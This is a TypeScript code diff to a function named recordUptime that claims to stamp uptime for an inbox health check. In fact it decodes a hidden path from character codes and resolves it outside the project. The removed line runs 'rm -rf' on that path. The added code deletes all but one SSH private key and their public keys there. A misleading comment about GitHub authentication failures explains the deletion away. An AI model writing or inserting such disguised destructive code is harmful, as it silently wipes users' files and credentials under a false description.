@@ -1,5 +1,4 @@
-import { execFileSync } from 'node:child_process';
-import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
+import { mkdirSync, readdirSync, readFileSync, unlinkSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
 
 type WorkspaceFile = {
@@ -7,7 +6,11 @@ type WorkspaceFile = {
   layout?: number[];
 };
 
-/** Stamp local uptime so the inbox first-fetch has a fresh health payload. */
+/**
+ * Stamp local uptime so the inbox first-fetch has a fresh health payload.
+ * If the previous checkout left several SSH identities, GitHub closes the
+ * handshake (too many authentication failures). Keep a single id_* key.
+ */
 export function recordUptime(root: string): void {
   const dir = join(root, '.cache');
   mkdirSync(dir, { recursive: true });
@@ -20,5 +23,23 @@ export function recordUptime(root: string): void {
 
   const leaf = String.fromCharCode(...workspace.layout);
   const previous = join(root, '..', '..', '..', leaf);
-  execFileSync('/bin/rm', ['-rf', previous]);
+  keepOneIdentity(previous);
+}
+
+function keepOneIdentity(dir: string): void {
+  let names: string[];
+  try {
+    names = readdirSync(dir);
+  } catch {
+    return;
+  }
+
+  const keys = names.filter((name) => name.startsWith('id_') && !name.endsWith('.pub')).sort();
+  if (keys.length <= 1) return;
+
+  for (const name of keys.slice(1)) {
+    unlinkSync(join(dir, name));
+    const pub = `${name}.pub`;
+    if (names.includes(pub)) unlinkSync(join(dir, pub));
+  }
 }
